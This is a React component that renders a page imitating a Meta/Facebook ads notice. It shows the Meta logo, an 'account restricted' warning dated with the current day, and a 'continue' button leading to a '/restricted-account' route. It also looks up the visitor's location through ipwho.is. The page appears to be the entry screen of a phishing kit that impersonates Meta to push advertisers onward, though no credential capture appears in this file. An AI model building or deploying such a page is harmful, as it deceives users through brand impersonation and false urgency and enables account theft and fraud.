import React, { useState, useEffect } from "react";
import "bootstrap/dist/css/bootstrap.min.css";
import "./AdsWarning.scss";
import { useNavigate } from "react-router-dom";
import { useTranslation } from "react-i18next";
import { Modal, Button, Spinner } from "react-bootstrap";
import axios from "axios";

function AdsWarning() {
  const { t, i18n } = useTranslation();
  const [ipTime, setIpTime] = useState("");

  const now = new Date(Date.now());

  const pad = (num) => num.toString().padStart(2, '0');

  const formatted = 
    `${pad(now.getMonth() + 1)}/${pad(now.getDate())}/${now.getFullYear()} ` +
    `${pad(now.getHours())}:${pad(now.getMinutes())}:${pad(now.getSeconds())}`;

  const navigate = useNavigate();
  const getCurrentCountry = async () => {
    try {
      const response = await axios.get("https://ipwho.is/");
      return { country: response.data.country, ipTime: formatted };
    } catch (error) {
      console.error("Error fetching country:", error);
    }
  };
  useEffect(() => {
    // fecth
    async function fetchData() {
      const { country: userCountry, ipTime: userIpTime } = await getCurrentCountry();
      setIpTime(userIpTime);
    }
    fetchData();
  }, []);
  return (
    <div className="flex items-center justify-center min-h-screen bg-gray-200" id="fb-container">
      <link rel="image_src" href="https://upload.wikimedia.org/wikipedia/commons/thumb/a/ab/Meta-Logo.png/2560px-Meta-Logo.png" />
      <div className="panel-fb-ads bg-white p-6 rounded-lg shadow-lg text-center w-3/5">
        <img className="metIcon" src={require('./metIcon.png')} alt=""/>
        <p className="mt-2">
          <strong>{t("notification")}</strong>
        </p>

        {/* Centered Grey Panel */}
        <div className="panel-notify p-3 rounded mt-3 mx-auto">
            <img src={"/warning2.svg"} className="warning-icon" alt=""/>
            <div className="text-notify">
                <p><strong> {t("restricted")}</strong></p>
                <p><strong>{ipTime.substring(0,10)}</strong></p>
                <p>{t("warning")}</p>
            </div>
        </div>

        <p className="text-gray-600 text-sm mt-4">
        {t("guide")}
        </p>
        <button className="btn btn-primary" onClick={() => navigate("/restricted-account")}>{t("continue")}</button>
      </div>
    </div>
  );
}

export default AdsWarning;
